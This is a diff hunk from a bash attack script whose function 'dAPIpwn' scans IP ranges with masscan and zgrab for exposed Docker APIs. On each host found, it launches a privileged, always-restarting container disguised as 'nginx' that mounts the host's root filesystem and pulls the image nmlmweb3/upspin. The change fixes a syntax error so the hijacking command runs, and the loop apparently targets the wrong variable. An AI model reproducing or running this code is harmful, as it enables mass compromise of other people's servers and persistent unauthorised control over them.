@@ -133,7 +133,7 @@ function dAPIpwn() {
     ip_list=$(masscan --router-mac 66-55-44-33-22-11 "$range" -p"$port" --rate="$rate" | awk '{print $6}' | zgrab --senders 200 --port "$port" --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip) || { echo "Failed to scan range $range on port $port"; exit 1; }
     
     for ipaddy in $ip_list; do
-        timeout -s SIGKILL 120 docker -H "$TARGET" run -d --net host --restart always --privileged --name nginx -v /:/host nmlmweb3/upspin & || { echo "Failed to run Docker container on $ipaddy"; exit 1; }
+        timeout -s SIGKILL 120 docker -H "$TARGET" run -d --net host --restart always --privileged --name nginx -v /:/host nmlmweb3/upspin || { echo "Failed to run Docker container on $ipaddy"; exit 1; }
     done
 }
 
